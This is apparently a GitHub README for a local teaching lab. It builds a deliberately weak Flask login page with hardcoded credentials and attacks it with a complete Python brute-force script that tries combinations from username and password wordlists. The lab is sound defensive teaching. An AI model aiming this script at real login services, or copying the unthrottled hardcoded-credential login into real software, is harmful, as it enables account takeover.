# 🔐 Python Flask Brute-Force Lab

A hands-on cybersecurity lab where I built a local Python Flask login page and attacked it with a custom brute-force script to demonstrate credential-stuffing attacks and authentication vulnerabilities.

---

## 🎯 Lab Goal

Build a local login page using **Python Flask**, then attack it with a **Python brute-force script** that cycles through a username list and password list until it finds the correct credentials.

---

## 🛠️ Tools Used

- **Terminal** (macOS)
- **Visual Studio Code**
- **Python 3** (via Homebrew)
- **Flask** and **Requests** (inside a virtual environment)

**💰 Cost:** Free — no subscriptions, no paid platforms, no VMs required.

---

## 📁 Files Overview

| File            | Purpose                                      |
|-----------------|----------------------------------------------|
| `flaskapp.py`   | The target — a local login page on port 34224 |
| `testpwlist.txt`| The password wordlist                        |
| `usernames.txt` | The username list                            |
| `attack.py`     | The brute-force attack script                |

All files live in: `~/Desktop/flask-lab/`

---

## 📋 Prerequisites

- macOS with Terminal
- Python 3 installed 
- Visual Studio Code 

---

## 🚀 Setup & Run Instructions

### Step 1 — Check Python

Open **Terminal** and run:

```bash
python3 --version
```

Expected output: `Python 3.x.x`

---

### Step 2 — Create the Project Folder

In **Terminal**, run:

```bash
mkdir ~/Desktop/flask-lab
cd ~/Desktop/flask-lab
```

---

### Step 3 — Set Up the Virtual Environment

In **Terminal**, run:

```bash
python3 -m venv ~/Desktop/flask-lab/venv
source ~/Desktop/flask-lab/venv/bin/activate
```

Your prompt should now show **`(venv)`** at the beginning.

---

### Step 4 — Install Flask and Requests

In **Terminal**, run:

```bash
pip install flask requests
```


---

### Step 5 — Open Visual Studio Code

1. Open **Visual Studio Code**:
   - Press `Cmd + Space`, type `Visual Studio Code`, press `Enter`
   - Or click the VS Code icon in your Dock

2. In VS Code, go to **File → Open Folder…**

3. Navigate to:

   ```text
   ~/Desktop/flask-lab/
   ```

4. Click **Open**

You should now see the `flask-lab` folder in the VS Code Explorer (left panel).

---

### Step 6 — Create `flaskapp.py` in VS Code

1. In VS Code, click **New File** in the Explorer (or press `Cmd + N`)
2. Name the file: `flaskapp.py`
3. Paste this code:

```python
from flask import Flask, request

app = Flask(__name__)

correct_username = "admin"
correct_password = "hunter2"

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == correct_username and password == correct_password:
            return "Welcome!"
        else:
            return "Invalid credentials!"

    return '''
    <form method="POST">
        Username: <input type="text" name="username" /><br/>
        Password: <input type="password" name="password" /><br/>
        <input type="submit" value="Login" />
    </form>
    '''

if __name__ == '__main__':
    app.run(port=34224)
```

4. Save: `Cmd + S`

---

### Step 7 — Create `testpwlist.txt` in VS Code

1. In VS Code, click **New File**
2. Name the file: `testpwlist.txt`
3. Paste these passwords (one per line):

```text
123456
password
letmein
hunter2
qwerty
```

4. Save: `Cmd + S`

---

### Step 8 — Create `usernames.txt` in VS Code

1. In VS Code, click **New File**
2. Name the file: `usernames.txt`
3. Paste these usernames (one per line):

```text
admin
testuser
guest
```

4. Save: `Cmd + S`

---

### Step 9 — Create `attack.py` in VS Code

1. In VS Code, click **New File**
2. Name the file: `attack.py`
3. Paste this code:

⚠️ **Replace `/Users/your-username/` with your actual username** (e.g., `/Users/malique/`):

```python
import requests

usernames = open('/Users/your-username/Desktop/flask-lab/usernames.txt', 'r')
passwords = open('/Users/your-username/Desktop/flask-lab/testpwlist.txt', 'r')
count = 1

for username in usernames:
    username = username.rstrip()
    passwords.seek(0)

    for password in passwords:
        password = password.rstrip()

        r = requests.post(
            'http://localhost:34224/',
            data={'username': username, 'password': password}
        )

        if 'Invalid credentials!' not in r.text:
            print(f'Found! Username: {username} | Password: {password}')
            exit()
        else:
            print(f'{count}. Incorrect — Username: {username} | Password: {password}')
            count += 1
```

4. Save: `Cmd + S`

---

### Step 10 — Run the Flask Server in Terminal

1. Open **Terminal**
2. Run:

   ```bash
   cd ~/Desktop/flask-lab
   source ~/Desktop/flask-lab/venv/bin/activate
   python3 ~/Desktop/flask-lab/flaskapp.py
   ```

3. Leave this Terminal window open. The server runs on:

   ```text
   http://127.0.0.1:34224
   ```

---

### Step 11 — Run the Attack Script in a Second Terminal

1. Open a **second Terminal window** (`Cmd + N` or `Cmd + T`)
2. Run:

   ```bash
   cd ~/Desktop/flask-lab
   source ~/Desktop/flask-lab/venv/bin/activate
   python3 ~/Desktop/flask-lab/attack.py
   ```

---

### ✅ Expected Output

```text
1. Incorrect — Username: admin | Password: 123456
2. Incorrect — Username: admin | Password: password
3. Incorrect — Username: admin | Password: letmein
Found! Username: admin | Password: hunter2
```

---

## 📸 Screenshots



### Login Page (Before Attack)
<img width="1536" height="971" alt="Screenshot:login-page" src="https://github.com/user-attachments/assets/49eddce9-4403-4116-85fa-96760eb5c18d" />

### Brute-Force Attack in Action
<img width="1093" height="691" alt="Screenshot:attack-output" src="https://github.com/user-attachments/assets/7da44015-c0f7-47ef-b6aa-57b048be94b8" />

### Successful Login

<img width="1536" height="971" alt="Screenshot:welcome-message" src="https://github.com/user-attachments/assets/551a1b6b-da73-4f0e-8edc-a91d057590ef" />



## ⚙️ How It Works

| Component            | What It Does                                                                 |
|----------------------|------------------------------------------------------------------------------|
| `flaskapp.py`        | Login page returning `"Welcome!"` for correct credentials                    |
| `attack.py`          | Loops through username/password combos via POST requests                     |
| `rstrip()`           | Removes newline characters (critical for matching)                           |
| `passwords.seek(0)`  | Resets password file to top for each new username                            |

The script stops immediately once it finds the correct credentials.

---

## 💡 Key Takeaways

- ✅ Activate the virtual environment in **every** Terminal window.
- ✅ Use **two Terminal windows**: one for the server, one for the attack.
- ✅ All files created in **VS Code** (Steps 5–9).
- ✅ `rstrip()` and `passwords.seek(0)` are both critical.
- ✅ Runs completely locally — no paid platforms or VMs required.
- ✅ Demonstrates the same logic used in real brute-force and credential-stuffing attacks.

---

## 📂 Folder Structure

```text
~/Desktop/flask-lab/
├── flaskapp.py       ← The target login server
├── testpwlist.txt    ← Password wordlist
├── usernames.txt     ← Username list
├── attack.py         ← Brute-force attack script
├── venv/             ← Virtual environment
└── screenshots/      ← Lab screenshots (optional)
```

---

## 🔄 Setup Summary

| Step | Tool          | Action                                        |
|------|---------------|-----------------------------------------------|
| 1–4  | Terminal      | Set up Python, venv, Flask, Requests          |
| 5–9  | VS Code       | Create all project files                      |
| 10   | Terminal 1    | Run Flask server (`flaskapp.py`)              |
| 11   | Terminal 2    | Run brute-force script (`attack.py`)          |

---

## 🎓 Educational Purpose

This lab is for **educational purposes only**. It demonstrates how brute-force attacks work so you can better understand:

- 🔒 How authentication vulnerabilities can be exploited
- 🛡️ Why defenses like rate limiting, account lockout, and CAPTCHA are important
- 🧪 How to build and test your own authentication systems securely



## 📜 License

Free to use for **educational purposes**.
